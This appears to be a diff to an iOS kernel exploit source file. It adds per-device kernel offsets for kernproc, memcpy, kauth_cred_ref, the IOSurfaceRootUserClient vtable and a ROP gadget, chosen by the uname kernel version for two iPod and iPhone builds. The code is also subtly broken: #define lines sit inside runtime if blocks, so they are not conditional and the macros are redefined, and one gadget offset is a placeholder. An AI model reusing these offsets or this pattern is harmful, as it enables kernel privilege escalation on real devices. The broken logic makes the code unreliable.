@@ -27,8 +27,17 @@
 #include <Foundation/Foundation.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <IOKit/IOKitLib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <strings.h>
+#include <sys/utsname.h>
 
 #define LOG(str, args...) do { NSLog(@str "\n", ##args); } while(0)
+
+void offsets()
+{
+struct utsname u = { 0 };
+uname(&u);
 
 #define OFFSET_TASK_ITK_SELF                        0xd8
 #define OFFSET_TASK_ITK_REGISTERED                  0x2e8
@@ -42,12 +51,25 @@
 #define OFFSET_IOUSERCLIENT_IPC                     0x9c
 #define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
 
+if (strcmp(u.version, "Darwin Kernel Version 16.7.0: Thu Jun 15 18:33:36 PDT 2017; root:xnu-3789.70.16~4/RELEASE_ARM64_T7000") == 0) //iPod7,1_10.3.3
+{
 #define OFFSET_KERNPROC                             0xfffffff0075b40c8
 #define OFFSET_BZERO                                0xfffffff00708df80
 #define OFFSET_MEMCPY                               0xfffffff00708ddd0
 #define OFFSET_KAUTH_CRED_REF                       0xfffffff007374d90
 #define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006ef2d78
 #define OFFSET_ROP_ADD_X0_X0_8                      0xfffffff0067290a8
+}
+if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM64_S8000") == 0) //iPhone8,1_10.3.2
+{
+#define OFFSET_KERNPROC                         0xfffffff0075a40c8
+#define OFFSET_BZERO                            0xfffffff007081f80
+#define OFFSET_MEMCPY                           0xfffffff007081dd0
+#define OFFSET_KAUTH_CRED_REF                   0xfffffff007367cf4
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB     0xfffffff006e7c9f8
+#define OFFSET_ROP_ADD_X0_X0_8                  0xfffffff000000000
+}
+}
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
